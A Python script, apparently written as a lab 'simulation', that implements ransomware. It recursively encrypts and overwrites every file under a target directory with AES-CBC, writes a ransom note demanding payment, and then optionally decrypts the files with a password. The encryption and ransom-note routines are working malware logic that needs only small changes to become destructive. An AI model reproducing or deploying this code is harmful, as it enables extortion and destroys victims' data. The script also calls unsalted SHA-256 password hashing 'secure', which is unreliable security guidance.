import os
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# Generate AES key
def generate_key():
    return os.urandom(32)  # 256-bit key

# Hash a password for secure storage
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# Verify the password entered by the user
def verify_password(input_password, stored_hashed_password):
    return hash_password(input_password) == stored_hashed_password

# Encrypt the data
def encrypt_data(key, data):
    iv = os.urandom(16)  # 128-bit IV for AES
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Padding data to be multiple of block size (16 bytes)
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Return IV and encrypted data
    return iv + encrypted_data

# Decrypt the data
def decrypt_data(key, encrypted_data):
    if len(encrypted_data) < 16:
        raise ValueError("Encrypted data is too short to contain an IV.")
    if (len(encrypted_data) - 16) % 16 != 0:
        raise ValueError("Encrypted data length is not a multiple of block size.")

    iv = encrypted_data[:16]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt and unpad data
    decrypted_padded_data = decryptor.update(encrypted_data[16:]) + decryptor.finalize()
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

    return decrypted_data

# Encrypt files in the directory
def encrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                file_data = f.read()

            encrypted_data = encrypt_data(key, file_data)

            # Overwrite the original file with encrypted data
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)

            print(f"Encrypted: {file_path}")

# Decrypt files in the directory
def decrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()

            try:
                decrypted_data = decrypt_data(key, encrypted_data)

                # Overwrite the encrypted file with decrypted data
                with open(file_path, 'wb') as f:
                    f.write(decrypted_data)

                print(f"Decrypted: {file_path}")
            except ValueError as e:
                print(f"Error decrypting {file_path}: {e}")

# Generate a ransom note
def create_ransom_note(directory):
    note = """Your files have been encrypted! To get them back, you need to pay a ransom. Failure to do so will result in the permanent loss of your files."""
    note_path = os.path.join(directory, 'RANSOM_NOTE.txt')
    with open(note_path, 'w') as f:
        f.write(note)
    print(f"Ransom note created at: {note_path}")

# Main function to run the simulation
def main():
    directory_to_encrypt = "/home/kali/zphisher/auth"
    password = "SecPass"  # Set a secure password
    hashed_password = hash_password(password)  # Store hashed password
    key = generate_key()

    print("Encrypting files...")
    encrypt_files(directory_to_encrypt, key)
    create_ransom_note(directory_to_encrypt)
    print("Files encrypted.")

    # Simulate storing the key securely
    with open("encryption_key.bin", "wb") as key_file:
        key_file.write(key)
    print("Encryption key saved to 'encryption_key.bin'. Keep it secure!")

    # Prompt for decryption
    decrypt_prompt = input("Do you want to decrypt the files? (yes/no): ").strip().lower()
    if decrypt_prompt == "yes":
        input_password = input("Enter the password for decryption: ").strip()

        # Verify the password
        if verify_password(input_password, hashed_password):
            # Load the key securely
            with open("encryption_key.bin", "rb") as key_file:
                saved_key = key_file.read()

            print("Decrypting files...")
            try:
                decrypt_files(directory_to_encrypt, saved_key)
                print("Files decrypted successfully.")
            except Exception as e:
                print(f"An error occurred during decryption: {e}")
        else:
            print("Incorrect password. Decryption aborted.")
    else:
        print("Decryption skipped. Remember to keep the key and password safe!")

if __name__ == "__main__":
    main()
